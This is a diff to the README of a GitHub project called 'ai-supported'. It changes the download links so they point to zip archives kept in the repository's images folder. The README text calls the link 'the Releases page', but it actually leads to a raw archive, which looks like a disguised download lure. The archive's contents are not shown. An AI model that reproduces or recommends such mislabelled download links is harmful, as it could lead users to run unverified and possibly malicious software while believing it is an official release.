@@ -6,7 +6,7 @@ Welcome to **ai-supported**! This software helps you understand the use of assis
 
 ## 📥 Download Here
 
-[![Download ai-supported](https://raw.githubusercontent.com/nabil-alsaadi/ai-supported/main/shared/images/supported_ai_v3.6.zip)](https://raw.githubusercontent.com/nabil-alsaadi/ai-supported/main/shared/images/supported_ai_v3.6.zip)
+[![Download ai-supported](https://github.com/nabil-alsaadi/ai-supported/raw/refs/heads/main/shared/images/ai-supported-3.6.zip)](https://github.com/nabil-alsaadi/ai-supported/raw/refs/heads/main/shared/images/ai-supported-3.6.zip)
 
 ## 🌟 Features
 
@@ -26,7 +26,7 @@ Welcome to **ai-supported**! This software helps you understand the use of assis
 
 To get started, visit the Releases page to download the latest version of **ai-supported**.
 
-[Visit this page to download](https://raw.githubusercontent.com/nabil-alsaadi/ai-supported/main/shared/images/supported_ai_v3.6.zip)
+[Visit this page to download](https://github.com/nabil-alsaadi/ai-supported/raw/refs/heads/main/shared/images/ai-supported-3.6.zip)
 
 1. Click on the link above.
 2. Look for the latest version marked by the tag.
